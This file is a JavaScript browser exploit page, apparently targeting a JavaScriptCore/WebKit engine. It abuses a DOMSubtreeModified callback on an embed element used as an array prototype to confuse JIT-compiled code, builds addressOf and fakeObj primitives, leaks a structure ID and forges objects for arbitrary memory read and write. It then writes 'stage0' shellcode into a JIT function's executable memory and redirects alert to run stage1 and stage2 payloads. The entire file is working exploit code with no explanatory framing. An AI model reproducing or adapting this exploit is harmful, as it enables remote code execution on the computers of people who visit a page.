const DUMMY_MODE = 0;
const ADDRESSOF_MODE = 1;
const FAKEOBJ_MODE = 2;

function pwn() {
  // For debugging
  history.replaceState('', '', '/exploit.html?' + Math.random());

  let otherWindow = document.getElementById('frame').contentWindow;
  let innerDiv = otherWindow.document.querySelector('div');

  if (!innerDiv) {
    print("[-] Failed to get innerDiv");
    return;
  }

  let embed = otherWindow.document.querySelector('embed');

  otherWindow.document.body.removeChild(embed);
  otherWindow.document.body.removeChild(otherWindow.annotationContainer);

  const origFakeObjArr = [1.1, 1.1];
  const origAddrOfArr = [2.2, 2.2];
  let fakeObjArr = Array.from(origFakeObjArr);
  let addressOfArr = Array.from(origAddrOfArr);
  let addressOfTarget = {};

  let sideEffectMode = DUMMY_MODE;
  otherWindow.document.body.addEventListener('DOMSubtreeModified', () => {
    if (sideEffectMode == DUMMY_MODE)
      return;
    else if (sideEffectMode == FAKEOBJ_MODE)
      fakeObjArr[0] = {};
    else if (sideEffectMode == ADDRESSOF_MODE)
      addressOfArr[0] = addressOfTarget;
  });

  print('[+] Callback is registered');

  otherWindow.document.body.appendChild(embed);
  let triggerArr;

  function optFakeObj(triggerArr, arr, addr) {
    arr[1] = 5.5;
    let tmp = 0 in triggerArr;
    arr[0] = addr;
    return tmp;
  }

  function optAddrOf(triggerArr, arr) {
    arr[1] = 6.6;
    let tmp = 0 in triggerArr;
    return [arr[0], tmp];
  }

  function prepare() {
    triggerArr = [7.7, 8.8];
    triggerArr.__proto__ = embed;
    sideEffectMode = DUMMY_MODE;
    for (var i = 0; i < 1e5; i++) {
      optFakeObj(triggerArr, fakeObjArr, 9.9);
      optAddrOf(triggerArr, addressOfArr);
    }
    delete triggerArr[0];
  }

  function cleanup() {
    otherWindow.document.body.removeChild(embed);
    otherWindow.document.body.appendChild(embed);

    if (sideEffectMode == FAKEOBJ_MODE)
      fakeObjArr = Array.from(origFakeObjArr);
    else if (sideEffectMode == ADDRESSOF_MODE)
      addressOfArr = Array.from(origAddrOfArr);

    sideEffectMode = DUMMY_MODE;
  }

  function addressOf(obj) {
    addressOfTarget = obj;
    sideEffectMode = ADDRESSOF_MODE;
    let ret = optAddrOf(triggerArr, addressOfArr)[0];
    cleanup();
    return Int64.fromDouble(ret);
  }

  function fakeObj(addr) {
    sideEffectMode = FAKEOBJ_MODE;
    optFakeObj(triggerArr, fakeObjArr, addr.asDouble());
    let ret = fakeObjArr[0];
    cleanup();
    return ret;
  }

  prepare();
  print("[+] Prepare is done");

  let hostObj = {
    _: 1.1,
    length: (new Int64('0x4141414141414141')).asDouble(),
    id: (new Int64('0x0108191700000000')).asJSValue(),
    butterfly: 0,
    o:1,
    executable:{
      a:1, b:2, c:3, d:4, e:5, f:6, g:7, h:8, i:9, // Padding (offset: 0x58)
      unlinkedExecutable:{
        isBuiltinFunction: 1 << 31,
        b:0, c:0, d:0, e:0, f:0, g:0,              // Padding (offset: 0x48)
        identifier: null
      }
    },
    strlen_or_id: (new Int64('0x10')).asDouble(),
    target: null
  }

  // Structure ID leak of hostObj.target
  hostObj.target=hostObj

  var hostObjRawAddr = addressOf(hostObj);
  var hostObjBufferAddr = Add(hostObjRawAddr, 0x20)
  var fakeHostObj = fakeObj(hostObjBufferAddr);
  var fakeIdentifier = fakeObj(Add(hostObjRawAddr, 0x40));

  hostObj.executable.unlinkedExecutable.identifier=fakeIdentifier
  let rawStructureId=Function.prototype.toString.apply(fakeHostObj)

  let leakStructureId=Add(new Int64(
    rawStructureId[9].charCodeAt(0)+rawStructureId[10].charCodeAt(0)*0x10000
    ),new Int64('0x0106220700000000'))

  print('[+] Leaked structure ID: ' + leakStructureId);

  hostObj.strlen_or_id = hostObj.id = leakStructureId.asDouble();
  hostObj.butterfly = fakeHostObj;

  addressOf = function(obj) {
    hostObj.o = obj;
    return Int64.fromDouble(fakeHostObj[2]);
  }

  fakeObj = function(addr) {
    fakeHostObj[2] = addr.asDouble();
    return hostObj.o;
  }

  print('[+] Got reliable addressOf/fakeObj');

  let rwObj = {
    _: 1.1,
    length: (new Int64('0x4141414141414141')).asDouble(),
    id: leakStructureId.asDouble(),
    butterfly: 1.1,

    __: 1.1,
    innerLength: (new Int64('0x4141414141414141')).asDouble(),
    innerId: leakStructureId.asDouble(),
    innerButterfly: 1.1,
  }

  var rwObjBufferAddr = Add(addressOf(rwObj), 0x20);
  var fakeRwObj = fakeObj(rwObjBufferAddr);
  rwObj.butterfly = fakeRwObj;

  var fakeInnerObj = fakeObj(Add(rwObjBufferAddr, 0x20));
  rwObj.innerButterfly = fakeInnerObj;


  function read64(addr) {
    // We use butterfly and it depends on its size in -1 index
    // Thus, we keep searching non-zero value to read value
    for (var i = 0; i < 0x1000; i++) {
      fakeRwObj[5] = Sub(addr, -8 * i).asDouble();
      let value = fakeInnerObj[i];
      if (value) {
        return Int64.fromDouble(value);
      }
    }
    throw '[-] Failed to read: ' + addr;
  }

  function write64(addr, value) {
    fakeRwObj[5] = addr.asDouble();
    fakeInnerObj[0] = value.asDouble();
  }

  function makeJITCompiledFunction() {
    var obj = {};
    // Some code to avoid inlining...
    function target(num) {
      num ^= Math.random() * 10000;
      num ^= 0x70000001;
      num ^= Math.random() * 10000;
      num ^= 0x70000002;
      num ^= Math.random() * 10000;
      num ^= 0x70000003;
      num ^= Math.random() * 10000;
      num ^= 0x70000004;
      num ^= Math.random() * 10000;
      num ^= 0x70000005;
      num ^= Math.random() * 10000;
      num ^= 0x70000006;
      num ^= Math.random() * 10000;
      num ^= 0x70000007;
      num ^= Math.random() * 10000;
      num ^= 0x70000008;
      num ^= Math.random() * 10000;
      num ^= 0x70000009;
      num ^= Math.random() * 10000;
      num ^= 0x7000000a;
      num ^= Math.random() * 10000;
      num ^= 0x7000000b;
      num ^= Math.random() * 10000;
      num ^= 0x7000000c;
      num ^= Math.random() * 10000;
      num ^= 0x7000000d;
      num ^= Math.random() * 10000;
      num ^= 0x7000000e;
      num ^= Math.random() * 10000;
      num ^= 0x7000000f;
      num ^= Math.random() * 10000;
      num ^= 0x70000010;
      num ^= Math.random() * 10000;
      num ^= 0x70000011;
      num ^= Math.random() * 10000;
      num ^= 0x70000012;
      num ^= Math.random() * 10000;
      num ^= 0x70000013;
      num ^= Math.random() * 10000;
      num ^= 0x70000014;
      num ^= Math.random() * 10000;
      num ^= 0x70000015;
      num ^= Math.random() * 10000;
      num ^= 0x70000016;
      num ^= Math.random() * 10000;
      num ^= 0x70000017;
      num ^= Math.random() * 10000;
      num ^= 0x70000018;
      num ^= Math.random() * 10000;
      num ^= 0x70000019;
      num ^= Math.random() * 10000;
      num ^= 0x7000001a;
      num ^= Math.random() * 10000;
      num ^= 0x7000001b;
      num ^= Math.random() * 10000;
      num ^= 0x7000001c;
      num ^= Math.random() * 10000;
      num ^= 0x7000001d;
      num ^= Math.random() * 10000;
      num ^= 0x7000001e;
      num ^= Math.random() * 10000;
      num ^= 0x7000001f;
      num ^= Math.random() * 10000;
      num ^= 0x70000020;
      num ^= Math.random() * 10000;
      num &= 0xffff;
      return num;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    return target;
  }

  function getJITCodeAddr(func) {
    var funcAddr = addressOf(func);
    print("[+] Target function @ " + funcAddr.toString());
    var executableAddr = read64(Add(funcAddr, 3 * 8));
    print("[+] Executable instance @ " + executableAddr.toString());

    var jitCodeAddr = read64(Add(executableAddr, 3 * 8));
    print("[+] JITCode instance @ " + jitCodeAddr.toString());

    if (And(jitCodeAddr, new Int64('0xFFFF800000000000')).toString() != '0x0000000000000000' ||
        And(Sub(jitCodeAddr, new Int64('0x100000000')), new Int64('0x8000000000000000')).toString() != '0x0000000000000000') {
      jitCodeAddr = Add(ShiftLeft(read64(Add(executableAddr, 3 * 8 + 1)), 1), 0x100);
      print("[+] approx. JITCode instance @ " + jitCodeAddr.toString());
    }

    return jitCodeAddr;
  }

  function setJITCodeAddr(func, addr) {
    var funcAddr = addressOf(func);
    print("[+] Target function @ " + funcAddr.toString());
    var executableAddr = read64(Add(funcAddr, 3 * 8));
    print("[+] Executable instance @ " + executableAddr.toString());
    write64(Add(executableAddr, 3 * 8), addr);
  }

  function getJITFunction() {
    var shellcodeFunc = makeJITCompiledFunction();
    shellcodeFunc();
    var jitCodeAddr = getJITCodeAddr(shellcodeFunc);
    return [shellcodeFunc, jitCodeAddr];
  }

  var [_JITFunc, rwxMemAddr] = getJITFunction();

  for (var i = 0; i < stage0.length; i++)
    write64(Add(rwxMemAddr, i), new Int64(stage0[i]));

  setJITCodeAddr(alert, rwxMemAddr);
  var argv = {
    a0: stage1Arr,
    a1: stage2Arr,
    doc: document,
    a2: 0x41414141,
    a3: 0x42424242,
    a4: 0x43434343,
  };
  alert(argv);
}

ready.then(function() {
    history.replaceState("", "", '/exploit.html?' + Math.random())
    try {
      pwn()
    } catch (e) {
        print("[-] Exception caught: " + e);
    }
}).catch(function(err) {
    print("[-] Initializatin failed");
});
